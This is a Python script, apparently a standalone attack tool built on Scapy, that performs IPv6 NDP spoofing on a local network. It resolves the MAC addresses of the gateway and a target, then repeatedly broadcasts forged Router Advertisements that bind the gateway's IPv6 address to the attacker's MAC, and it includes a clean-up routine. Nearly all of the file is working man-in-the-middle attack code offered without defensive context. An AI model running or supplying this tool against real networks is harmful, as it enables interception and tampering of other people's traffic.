from threading import Thread
from scapy.all import *
import netifaces as ni


stop = 1


def NDP_poison(target_ipv6, gateway_ipv6, target_mac, gateway_mac, host_mac):
    print("[*] NDP poisoning...")

    try:
        global stop
        while stop:
            ether = (Ether(dst='33:33:00:00:00:01', src=host_mac))
            ipv6 = IPv6(src=gateway_ipv6, dst='ff02::1')
            ra = ICMPv6ND_RA()
            lla = ICMPv6NDOptSrcLLAddr(lladdr=host_mac)
            sendp(ether/ipv6/ra/lla, iface='wlp3s0', verbose=0)

    except Exception as e:
        print("[!!] Error while ndp spoofing: " + str(e))
    finally:
        clean_up(target_ipv6, gateway_ipv6, target_mac, gateway_mac)
        print("[*] NDP poisoning has ended")


def clean_up(target_ip, gateway_ipv6, target_mac, gateway_mac):
    print("[*] Cleaning ndp cache...")

    try:
        ether = (Ether(dst='33:33:00:00:00:01', src=gateway_mac))
        ipv6 = IPv6(src=gateway_ipv6, dst='ff02::1')
        ra = ICMPv6ND_RA()
        lla = ICMPv6NDOptSrcLLAddr(lladdr=gateway_mac)
        sendp(ether / ipv6 / ra / lla, iface='wlp3s0', verbose=0)
    except Exception as e:
        print("[!!] Error while cleaning up ndp: " + str(e))


def ndpspoof(target_ipv6, interface):
    try:
        if interface not in ni.interfaces():
            print("No such network interface: " + interface)
            exit(-1)
        host_ipv6 = ni.ifaddresses(interface)[10][-1]['addr'].replace('%'+interface, '')

        host_mac = ni.ifaddresses(interface)[ni.AF_LINK][0]['addr']

        gws = ni.gateways()
        gateway_ipv6 = gws['default'][ni.AF_INET6][0]

        print("[*] Getting MAC address of default gateway...")
        pkt = sr1(IPv6(dst=gateway_ipv6)/ICMPv6ND_NS(tgt=gateway_ipv6), iface='wlp3s0', verbose=0)
        gateway_mac = pkt[ICMPv6NDOptDstLLAddr].lladdr

        if gateway_mac is None:
            print("[*] Could not get MAC address of default gateway")
            exit(-1)

        print("[*] Getting MAC address of target...")
        pkt = sr1(IPv6(dst=target_ipv6) / ICMPv6ND_NS(tgt=target_ipv6), iface='wlp3s0', verbose=0)
        target_mac = pkt[ICMPv6NDOptDstLLAddr].lladdr
        if target_mac is None:
            print("[*] Could not get MAC address of target")
            exit(-1)

        print("\tHost IP: ", host_ipv6)
        print("\tHost MAC: ", host_mac)
        print("\tDefault gateway IP: ", gateway_ipv6)
        print("\tDefault gateway MAC: ", gateway_mac)
        print("\tTarget IP: ", target_ipv6)
        print("\tTarget MAC: ", target_mac)

        ndp_poison = Thread(target=NDP_poison, args=(target_ipv6, gateway_ipv6, target_mac, gateway_mac, host_mac))
        ndp_poison.start()
    except Exception as e:
        print("[!!] Error while initializing ndpspoof: " + str(e))


